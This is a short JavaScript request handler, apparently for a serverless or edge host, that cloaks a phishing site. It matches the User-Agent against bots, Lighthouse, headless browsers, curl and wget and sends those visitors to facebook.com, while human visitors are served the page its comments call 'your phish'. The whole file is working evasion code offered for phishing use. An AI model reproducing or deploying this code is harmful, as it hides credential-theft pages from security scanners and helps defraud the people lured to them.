export default async function handler(req) {
    const ua = req.headers['user-agent'] || '';

    // 🛡️ SERVER-SIDE BOT BLOCK (Before JS loads)
    const botPatterns = /Googlebot|Lighthouse|Chrome-Lighthouse|bot|crawler|spider|robot|headless|wget|curl/i;

    if (botPatterns.test(ua)) {
        return Response.redirect('https://www.facebook.com', 302);
    }

    // Human → Pass to your phishing index.html
    const phishUrl = new URL(req.url);
    phishUrl.pathname = '/index.html'; // Serve your phish

    return fetch(phishUrl.toString(), {
        method: req.method,
        headers: req.headers,
        body: req.body
    });
}